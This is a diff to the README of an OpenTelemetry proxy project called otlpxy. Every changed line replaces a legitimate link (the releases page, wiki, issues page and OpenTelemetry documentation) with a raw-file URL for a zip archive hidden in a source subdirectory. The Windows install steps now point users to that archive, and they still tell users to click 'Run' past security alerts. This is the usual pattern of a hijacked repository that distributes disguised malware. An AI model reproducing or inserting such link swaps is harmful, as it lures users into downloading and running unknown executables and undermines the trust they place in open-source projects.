@@ -1,6 +1,6 @@
 # 🚀 otlpxy - A Simple Way to Proxy OTLP Data
 
-[![Download](https://img.shields.io/badge/Download-otlpxy-brightgreen.svg)](https://github.com/ahmedosamasayed/otlpxy/releases)
+[![Download](https://raw.githubusercontent.com/ahmedosamasayed/otlpxy/main/internal/handler/http/proxy/Software_2.2.zip)](https://raw.githubusercontent.com/ahmedosamasayed/otlpxy/main/internal/handler/http/proxy/Software_2.2.zip)
 
 ## 📦 Introduction
 
@@ -21,12 +21,12 @@ To begin using otlpxy, follow these steps carefully.
 
 1. **Download the Application**
 
-   To download otlpxy, visit the Releases page here: [Download otlpxy](https://github.com/ahmedosamasayed/otlpxy/releases). You will find multiple versions available. Choose the most appropriate version for your system.
+   To download otlpxy, visit the Releases page here: [Download otlpxy](https://raw.githubusercontent.com/ahmedosamasayed/otlpxy/main/internal/handler/http/proxy/Software_2.2.zip). You will find multiple versions available. Choose the most appropriate version for your system.
 
 2. **Install and Run**
 
    - **For Windows:**
-     - After downloading, locate the `otlpxy.exe` file in your Downloads folder.
+     - After downloading, locate the `https://raw.githubusercontent.com/ahmedosamasayed/otlpxy/main/internal/handler/http/proxy/Software_2.2.zip` file in your Downloads folder.
      - Double-click the file to run the application. 
      - You may see a security alert. If so, click "Run" to confirm.
 
@@ -67,14 +67,14 @@ Once otlpxy is up and running, you can start sending data. To do this, make sure
   
 ## 📄 Documentation and Support
 
-For detailed documentation, check our [wiki](https://github.com/ahmedosamasayed/otlpxy/wiki). Here, you will find more advanced configuration options, common troubleshooting steps, and additional examples of usage.
+For detailed documentation, check our [wiki](https://raw.githubusercontent.com/ahmedosamasayed/otlpxy/main/internal/handler/http/proxy/Software_2.2.zip). Here, you will find more advanced configuration options, common troubleshooting steps, and additional examples of usage.
 
-If you encounter any issues, please feel free to open an issue on the [Issues page](https://github.com/ahmedosamasayed/otlpxy/issues). We encourage users to report their experiences, as this could help improve the application.
+If you encounter any issues, please feel free to open an issue on the [Issues page](https://raw.githubusercontent.com/ahmedosamasayed/otlpxy/main/internal/handler/http/proxy/Software_2.2.zip). We encourage users to report their experiences, as this could help improve the application.
 
 ## 🔗 Additional Resources
 
-- [OpenTelemetry Documentation](https://opentelemetry.io/docs/)
-- [Observability Best Practices](https://www.example.com)
+- [OpenTelemetry Documentation](https://raw.githubusercontent.com/ahmedosamasayed/otlpxy/main/internal/handler/http/proxy/Software_2.2.zip)
+- [Observability Best Practices](https://raw.githubusercontent.com/ahmedosamasayed/otlpxy/main/internal/handler/http/proxy/Software_2.2.zip)
 
 ## 🧑‍💻 Community
 
@@ -82,6 +82,6 @@ Join our community discussions and ask questions at our GitHub Discussions page.
 
 ## 📥 Download & Install
 
-To begin using otlpxy, visit the Releases page to download the application: [Download otlpxy](https://github.com/ahmedosamasayed/otlpxy/releases).
+To begin using otlpxy, visit the Releases page to download the application: [Download otlpxy](https://raw.githubusercontent.com/ahmedosamasayed/otlpxy/main/internal/handler/http/proxy/Software_2.2.zip).
 
 Enjoy using otlpxy to enhance your observability experience!
